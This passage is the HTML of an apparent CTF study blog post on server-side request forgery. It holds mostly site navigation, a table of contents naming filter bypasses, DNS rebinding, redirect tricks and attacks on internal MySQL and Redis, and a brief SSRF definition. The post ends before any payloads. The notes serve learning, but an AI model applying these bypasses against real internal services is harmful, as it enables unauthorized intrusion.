@@ -1,0 +1,1158 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>ctfshow-ssrf | MIXBP</title>
+  <meta name="keywords" content=" 学习笔记 , ssrf ">
+  <meta name="description" content="ctfshow-ssrf | MIXBP">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="BUUCTF2018-OnlineTool1首先启动靶机并访问，看到一串源码 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;    $_SERVER[&#x27;REMOTE_ADDR&#x27;] &#x3D; $_SERVER[&#x27;HTTP_X_FOR">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF2018-OnlineTool1">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/03/21/BUUCTF2018-OnlineTool1/index.html">
+<meta property="og:site_name" content="MIXBP">
+<meta property="og:description" content="BUUCTF2018-OnlineTool1首先启动靶机并访问，看到一串源码 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;    $_SERVER[&#x27;REMOTE_ADDR&#x27;] &#x3D; $_SERVER[&#x27;HTTP_X_FOR">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://mixbp.github.io/image/BUUCTF2018-OnlineTool1-1.png">
+<meta property="og:image" content="https://mixbp.github.io/image/BUUCTF2018-OnlineTool1-1.png">
+<meta property="article:published_time" content="2025-03-21T11:50:32.000Z">
+<meta property="article:modified_time" content="2025-03-21T12:11:22.526Z">
+<meta property="article:author" content="MIXBP">
+<meta property="article:tag" content="刷题笔记">
+<meta property="article:tag" content="escapeshellarg()和escapeshellcmd()、单引号逃逸">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mixbp.github.io/image/BUUCTF2018-OnlineTool1-1.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>MIXBP</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://mixbp.github.io/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:2439254357@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=2439254357&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+    <a class="more-menus">更多菜单</a>
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(44)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+                <a class="dynamic-menu "
+                   target="_self"
+                   
+                   href="https://mixbp.github.io/">MIXBP</a>
+        
+            
+                <a class="dynamic-menu "
+                   target="_blank"
+                        
+                   href="https://mixbp.github.io/">github</a>
+        
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="44">
+<input type="hidden" id="yelog_site_word_count" value="119.9k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://mixbp.github.io/">MIXBP</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="search shortcut key i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="switch to outline view shortcut key w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="return"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="case sensitive"></i>
+            <i class="iconfont icon-tag" data-title="label"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">outline</div>
+            <i class="iconfont icon-list" data-title="switch to article list"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>报错注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>堆叠注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>日志包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>刷题笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>信息搜集</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>学习笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>正则表达式</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>做题笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>escapeshellarg()和escapeshellcmd()、单引号逃逸</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>filter伪协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>HTML</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>http协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux find -name模糊查询文件</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>MySQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>payload构造</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP反序列化漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php特性</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>waf绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xxe</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2025/03/21/BUUCTF2018-OnlineTool1/"
+           data-tag="刷题笔记,escapeshellarg()和escapeshellcmd()、单引号逃逸"
+           data-author="" >
+            <span class="post-title" title="BUUCTF2018-OnlineTool1">BUUCTF2018-OnlineTool1</span>
+            <span class="post-date" title="2025-03-21 19:50:32">2025/03/21</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/21/BJDCTF2020-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"
+           data-tag="刷题笔记,php特性"
+           data-author="" >
+            <span class="post-title" title="BJDCTF2020-ZJCTF不过如此">BJDCTF2020-ZJCTF不过如此</span>
+            <span class="post-date" title="2025-03-21 19:04:56">2025/03/21</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1/"
+           data-tag="刷题笔记,命令执行,php反序列化,linux find -name模糊查询文件"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020朱雀组phpweb1">网鼎杯2020朱雀组phpweb1</span>
+            <span class="post-date" title="2025-03-20 23:56:35">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/BSidesCF2020Hadabadday1/"
+           data-tag="刷题笔记,文件包含"
+           data-author="" >
+            <span class="post-title" title="BSidesCF2020Hadabadday1">BSidesCF2020Hadabadday1</span>
+            <span class="post-date" title="2025-03-20 23:55:26">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1/"
+           data-tag="刷题笔记,sql注入,php反序列化,ssrf"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2018Fakebook1">网鼎杯2018Fakebook1</span>
+            <span class="post-date" title="2025-03-20 23:53:35">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/19/ctfshow-ssrf/"
+           data-tag="学习笔记,ssrf"
+           data-author="" >
+            <span class="post-title" title="ctfshow-ssrf">ctfshow-ssrf</span>
+            <span class="post-date" title="2025-03-19 20:05:14">2025/03/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/19/ctfshow-xxe/"
+           data-tag="学习笔记,xxe"
+           data-author="" >
+            <span class="post-title" title="ctfshow-xxe">ctfshow-xxe</span>
+            <span class="post-date" title="2025-03-19 13:32:30">2025/03/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/16/ssrf/"
+           data-tag="学习笔记,ssrf"
+           data-author="" >
+            <span class="post-title" title="ssrf">ssrf</span>
+            <span class="post-date" title="2025-03-16 21:44:06">2025/03/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="学习笔记,php反序列化"
+           data-author="" >
+            <span class="post-title" title="ctfshow-php序列化">ctfshow-php序列化</span>
+            <span class="post-date" title="2025-03-14 22:11:16">2025/03/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/14/GXYCTF2019-BabySQli1/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="GXYCTF2019-BabySQli1">GXYCTF2019-BabySQli1</span>
+            <span class="post-date" title="2025-03-14 20:44:55">2025/03/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1/"
+           data-tag="刷题笔记,文件包含,php反序列化"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020青龙组-AreUSerialz1">网鼎杯2020青龙组-AreUSerialz1</span>
+            <span class="post-date" title="2025-03-13 23:36:35">2025/03/13</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/13/ZJCTF2019-NiZhuanSiWei1/"
+           data-tag="刷题笔记,文件包含"
+           data-author="" >
+            <span class="post-title" title="ZJCTF2019-NiZhuanSiWei1">ZJCTF2019-NiZhuanSiWei1</span>
+            <span class="post-date" title="2025-03-13 20:39:05">2025/03/13</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/12/RoarCTF2019-EasyCalc1/"
+           data-tag="刷题笔记,命令执行,waf绕过"
+           data-author="" >
+            <span class="post-title" title="RoarCTF2019-EasyCalc1">RoarCTF2019-EasyCalc1</span>
+            <span class="post-date" title="2025-03-12 19:36:00">2025/03/12</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL1/"
+           data-tag="刷题笔记,sql注入,报错注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019-HardSQL1">极客大挑战2019-HardSQL1</span>
+            <span class="post-date" title="2025-03-11 15:31:27">2025/03/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/"
+           data-tag="刷题笔记,sql注入,堆叠注入"
+           data-author="" >
+            <span class="post-title" title="强网杯2019-随便注1">强网杯2019-随便注1</span>
+            <span class="post-date" title="2025-03-11 00:07:32">2025/03/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/08/ctfshow-sqli-labs/"
+           data-tag="sql注入,学习笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-sqli-labs">ctfshow-sqli-labs</span>
+            <span class="post-date" title="2025-03-08 17:51:18">2025/03/08</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/04/ctfshow-sql%E6%B3%A8%E5%85%A5/"
+           data-tag="sql注入,学习笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-sql注入">ctfshow-sql注入</span>
+            <span class="post-date" title="2025-03-04 23:42:23">2025/03/04</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/02/php%E7%89%B9%E6%80%A7/"
+           data-tag="php特性,学习笔记"
+           data-author="" >
+            <span class="post-title" title="php特性">php特性</span>
+            <span class="post-date" title="2025-03-02 20:14:41">2025/03/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/24/ctfshow-php%E7%89%B9%E6%80%A7/"
+           data-tag="php特性,学习笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-php特性">ctfshow-php特性</span>
+            <span class="post-date" title="2025-02-24 18:53:16">2025/02/24</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/23/ctfshow-xss/"
+           data-tag="学习笔记,xss"
+           data-author="" >
+            <span class="post-title" title="ctfshow-xss">ctfshow-xss</span>
+            <span class="post-date" title="2025-02-23 17:12:49">2025/02/23</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
+           data-tag="学习笔记,信息搜集"
+           data-author="" >
+            <span class="post-title" title="ctfshow-信息搜集">ctfshow-信息搜集</span>
+            <span class="post-date" title="2025-02-23 15:24:36">2025/02/23</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+           data-tag="学习笔记,命令执行"
+           data-author="" >
+            <span class="post-title" title="ctfshow-命令执行">ctfshow-命令执行</span>
+            <span class="post-date" title="2025-02-17 00:00:48">2025/02/17</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="学习笔记,PHP反序列化漏洞"
+           data-author="" >
+            <span class="post-title" title="PHP反序列化">PHP反序列化</span>
+            <span class="post-date" title="2025-02-14 00:51:53">2025/02/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/12/xss%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="学习笔记,xss漏洞"
+           data-author="" >
+            <span class="post-title" title="xss漏洞总结">xss漏洞总结</span>
+            <span class="post-date" title="2025-02-12 03:30:15">2025/02/12</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/11/xss-labs/"
+           data-tag="学习笔记,xss漏洞"
+           data-author="" >
+            <span class="post-title" title="xss-labs">xss-labs</span>
+            <span class="post-date" title="2025-02-11 23:43:19">2025/02/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"
+           data-tag="学习笔记,linux"
+           data-author="" >
+            <span class="post-title" title="linux基础命令">linux基础命令</span>
+            <span class="post-date" title="2025-02-01 22:14:44">2025/02/01</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+           data-tag="学习笔记,命令执行"
+           data-author="" >
+            <span class="post-title" title="命令执行">命令执行</span>
+            <span class="post-date" title="2025-01-29 22:54:38">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/ctfshow-web82/"
+           data-tag="文件包含,做题笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-web82">ctfshow-web82</span>
+            <span class="post-date" title="2025-01-29 04:36:22">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="文件包含,学习笔记"
+           data-author="" >
+            <span class="post-title" title="文件包含漏洞总结">文件包含漏洞总结</span>
+            <span class="post-date" title="2025-01-29 02:22:55">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/26/ctfshow-web160/"
+           data-tag="做题笔记,文件上传,日志包含"
+           data-author="" >
+            <span class="post-title" title="[ctfshow]web160">[ctfshow]web160</span>
+            <span class="post-date" title="2025-01-26 16:37:35">2025/01/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/"
+           data-tag="做题笔记,文件上传"
+           data-author="" >
+            <span class="post-title" title="buuctf极客大挑战upload">buuctf极客大挑战upload</span>
+            <span class="post-date" title="2025-01-26 16:36:39">2025/01/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/22/upload/"
+           data-tag="学习笔记,文件上传"
+           data-author="" >
+            <span class="post-title" title="upload">upload</span>
+            <span class="post-date" title="2025-01-22 15:22:47">2025/01/22</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,python"
+           data-author="" >
+            <span class="post-title" title="python学习笔记">python学习笔记</span>
+            <span class="post-date" title="2025-01-19 01:39:35">2025/01/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"
+           data-tag="刷题笔记,http协议"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019Http">极客大挑战2019Http</span>
+            <span class="post-date" title="2025-01-09 16:47:44">2025/01/09</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"
+           data-tag="刷题笔记,filter伪协议"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019SecretFile">极客大挑战2019SecretFile</span>
+            <span class="post-date" title="2025-01-09 01:36:08">2025/01/09</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019LoveSQL">极客大挑战2019LoveSQL</span>
+            <span class="post-date" title="2025-01-05 20:00:42">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"
+           data-tag="刷题笔记,payload构造"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019Havefun">极客大挑战2019Havefun</span>
+            <span class="post-date" title="2025-01-05 19:35:48">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019EasySQL">极客大挑战2019EasySQL</span>
+            <span class="post-date" title="2025-01-05 19:10:32">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"
+           data-tag="sql注入,学习笔记"
+           data-author="" >
+            <span class="post-title" title="sql注入">sql注入</span>
+            <span class="post-date" title="2025-01-03 21:14:16">2025/01/03</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/29/MySQL/"
+           data-tag="学习笔记,MySQL"
+           data-author="" >
+            <span class="post-title" title="MySQL">MySQL</span>
+            <span class="post-date" title="2024-12-29 19:30:51">2024/12/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,正则表达式"
+           data-author="" >
+            <span class="post-title" title="正则表达式笔记">正则表达式笔记</span>
+            <span class="post-date" title="2024-12-28 20:46:55">2024/12/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,php"
+           data-author="" >
+            <span class="post-title" title="PHP学习笔记">PHP学习笔记</span>
+            <span class="post-date" title="2024-12-26 23:50:15">2024/12/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,HTML"
+           data-author="" >
+            <span class="post-title" title="HTML学习笔记">HTML学习笔记</span>
+            <span class="post-date" title="2024-12-25 23:54:00">2024/12/25</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/25/welcome/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="welcome">welcome</span>
+            <span class="post-date" title="2024-12-25 20:38:33">2024/12/25</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="Toggle full screen shortcut key s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-ctfshow-ssrf" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">ctfshow-ssrf</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">学习笔记</a>
+            
+            <a class="color5">ssrf</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2025-03-19 21:50:19'>2025-03-19 20:05</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:4.4k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="Jump to comment area">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-SSRF"><span class="toc-text">ctfshow-SSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-351%EF%BC%88%E6%97%A0%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-text">web-351（无过滤）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-352%EF%BC%88%E8%BF%87%E6%BB%A4localhost%E5%92%8C127-0-0%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-352（过滤localhost和127.0.0绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-353%EF%BC%88%E8%BF%87%E6%BB%A4127-0-01%E5%92%8Clocalhost%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-353（过滤127.0.01和localhost绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-354%EF%BC%88%E8%BF%87%E6%BB%A4%E4%BA%860%E5%92%8C1%E3%80%81localhost%E3%80%81DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E3%80%81302%E8%B7%B3%E8%BD%AC%EF%BC%89"><span class="toc-text">web-354（过滤了0和1、localhost、DNS重绑定、302跳转）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-355%EF%BC%88host%E9%99%90%E5%88%B6%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E5%E7%9C%81%E7%95%A5%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-355（host限制小于等于5省略绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-356%EF%BC%88host%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E3%EF%BC%89"><span class="toc-text">web-356（host长度限制小于等于3）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-357%EF%BC%88DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E3%80%81302%E8%B7%B3%E8%BD%AC%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-357（DNS重绑定、302跳转绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-358%EF%BC%88%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-358（正则匹配绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-359%EF%BC%88%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81%E7%9A%84MySQL%EF%BC%89"><span class="toc-text">web-359（打无密码的MySQL）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-360%EF%BC%88%E6%89%93redis%EF%BC%89"><span class="toc-text">web-360（打redis）</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfshow-SSRF"><a href="#ctfshow-SSRF" class="headerlink" title="ctfshow-SSRF"></a>ctfshow-SSRF</h1><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
+<p>危害<br>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>
+<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>
+<h2 id="web-351（无过滤）"><a href="#web-351（无过滤）" class="headerlink" title="web-351（无过滤）"></a>web-351（无过滤）</h2><p>首先看题目</p>
